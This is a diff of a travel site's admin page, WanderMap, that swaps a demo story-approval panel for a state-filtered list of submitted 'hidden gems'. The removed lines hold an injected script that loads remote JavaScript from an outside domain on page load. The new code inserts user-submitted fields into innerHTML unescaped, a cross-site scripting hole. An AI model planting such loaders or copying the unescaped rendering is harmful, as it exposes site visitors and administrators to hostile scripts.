@@ -1,100 +1,130 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://mntzco.com/NDM0MTM5.js?t=434139';
-      document.head.appendChild(script);
-  })();
-</script>
-  <meta charset="UTF-8">
-  <title>WanderMap — Admin Approvals</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin - Hidden Gems | WanderMap</title>
+  <link rel="stylesheet" href="style.css" />
   <style>
-    body { font-family: 'Segoe UI', sans-serif; margin:0; padding:20px; background: #e0f7fa; }
-    nav {
-      background: #006064; padding: 16px;
-      color: #fff; text-align: center;
+    body {
+      font-family: Arial, sans-serif;
+      background: url('img/nature-about-bg.jpg') no-repeat center center/cover;
+      padding: 20px;
+      color: #222;
     }
-    nav a {
-      color: #fff; margin: 0 16px;
-      text-decoration: none; font-weight: bold;
-    }
-    h1 { text-align: center; color: #004d40; margin:20px 0; }
 
-    .card {
-      background: #fff; padding: 20px; margin: 20px auto;
+    .admin-container {
+      max-width: 900px;
+      margin: 40px auto;
+      background: rgba(255,255,255,0.95);
+      padding: 30px;
+      border-radius: 12px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-      border-radius: 8px; max-width: 500px;
     }
-    .card img {
-      max-width: 100%; border-radius: 8px; margin-bottom: 12px;
+
+    h1 {
+      text-align: center;
+      margin-bottom: 25px;
     }
-    .btn {
-      padding: 8px 14px; border:none; border-radius:4px;
-      margin-right:10px; cursor:pointer;
-      font-weight: bold;
+
+    #filterState {
+      width: 100%;
+      padding: 10px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
     }
-    .approve { background: #4caf50; color: #fff; }
-    .reject  { background: #f44336; color: #fff; }
+
+    .gem {
+      border-bottom: 1px solid #ccc;
+      padding: 15px 0;
+    }
+
+    .gem h3 {
+      margin: 0;
+    }
+
+    .gem p {
+      margin: 5px 0;
+    }
+
+    .gem small {
+      color: #555;
+    }
   </style>
 </head>
 <body>
+  <div class="admin-container">
+    <h1>📋 Submitted Hidden Gems</h1>
+    <input type="text" id="filterState" placeholder="Filter by state (e.g. Kerala)" />
 
-<nav>
-  <a href="index.html">Home</a>
-  <a href="map.html">Map</a>
-  <a href="gallery.html">Gallery</a>
-  <a href="post_story.html">Post Story</a>
-  <a href="admin.html">Admin Panel</a>
-</nav>
+    <div id="gemsList">
+      ⏳ Loading hidden gems...
+    </div>
+  </div>
 
-<h1>📝 Story Approval Panel</h1>
+  <script>
+    const gemsList = document.getElementById('gemsList');
+    const filterInput = document.getElementById('filterState');
 
-<div id="submissions"></div>
+    let allGems = [];
 
-<script>
-// Demo submission data — replace this with dynamic fetch from your Cloudinary upload log or backend API
-const submissions = [
-  {
-    name: "Ananya Singh",
-    image: "https://res.cloudinary.com/dyozyqrqn/image/upload/v1720000000/sample1.jpg",
-    story: "A breathtaking sunrise trek to Kalsubai peak!"
-  },
-  {
-    name: "Rohan Mehra",
-    image: "https://res.cloudinary.com/dyozyqrqn/image/upload/v1720000000/sample2.jpg",
-    story: "Peaceful boat ride in Varanasi Ghat — must visit once."
-  }
-];
+    async function fetchGems() {
+      try {
+        const states = [
+          "Andhra Pradesh", "Arunachal Pradesh", "Assam", "Bihar", "Chhattisgarh", "Goa", "Gujarat",
+          "Haryana", "Himachal Pradesh", "Jharkhand", "Karnataka", "Kerala", "Madhya Pradesh",
+          "Maharashtra", "Manipur", "Meghalaya", "Mizoram", "Nagaland", "Odisha", "Punjab",
+          "Rajasthan", "Sikkim", "Tamil Nadu", "Telangana", "Tripura", "Uttar Pradesh",
+          "Uttarakhand", "West Bengal"
+        ];
 
-// Load cards dynamically
-const container = document.getElementById("submissions");
-submissions.forEach((item, index) => {
-  const card = document.createElement("div");
-  card.className = "card";
-  card.innerHTML = `
-    <h3>👤 ${item.name}</h3>
-    <img src="${item.image}" alt="User Story Image">
-    <p>${item.story}</p>
-    <button class="btn approve" onclick="approve(${index})">Approve</button>
-    <button class="btn reject" onclick="reject(${index})">Reject</button>
-  `;
-  container.appendChild(card);
-});
+        let combined = [];
 
-// Approve/Reject actions
-function approve(index) {
-  alert(`Approved: ${submissions[index].name}'s story ✅`);
-  // Here you can add code to move data to your public gallery page or save it in Cloud/Google Sheet
-}
+        for (const state of states) {
+          const res = await fetch(`/api/hidden-gems/${state}`);
+          if (res.ok) {
+            const gems = await res.json();
+            combined.push(...gems);
+          }
+        }
 
-function reject(index) {
-  alert(`Rejected: ${submissions[index].name}'s story ❌`);
-  // Optional: remove card or log rejection
-}
-</script>
+        allGems = combined;
+        renderGems(combined);
+      } catch (err) {
+        gemsList.innerHTML = "❌ Error loading gems.";
+        console.error(err);
+      }
+    }
 
+    function renderGems(gems) {
+      if (gems.length === 0) {
+        gemsList.innerHTML = "⚠️ No gems found.";
+        return;
+      }
+
+      gemsList.innerHTML = "";
+      gems.forEach(gem => {
+        const div = document.createElement("div");
+        div.classList.add("gem");
+        div.innerHTML = `
+          <h3>${gem.name} (${gem.state})</h3>
+          <p>${gem.description}</p>
+          ${gem.image_url ? `<p><img src="${gem.image_url}" width="100" alt="gem image" /></p>` : ""}
+          <small>Submitted by: ${gem.submitted_by}</small>
+        `;
+        gemsList.appendChild(div);
+      });
+    }
+
+    filterInput.addEventListener("input", () => {
+      const keyword = filterInput.value.trim().toLowerCase();
+      const filtered = allGems.filter(g => g.state.toLowerCase().includes(keyword));
+      renderGems(filtered);
+    });
+
+    fetchGems();
+  </script>
 </body>
 </html>
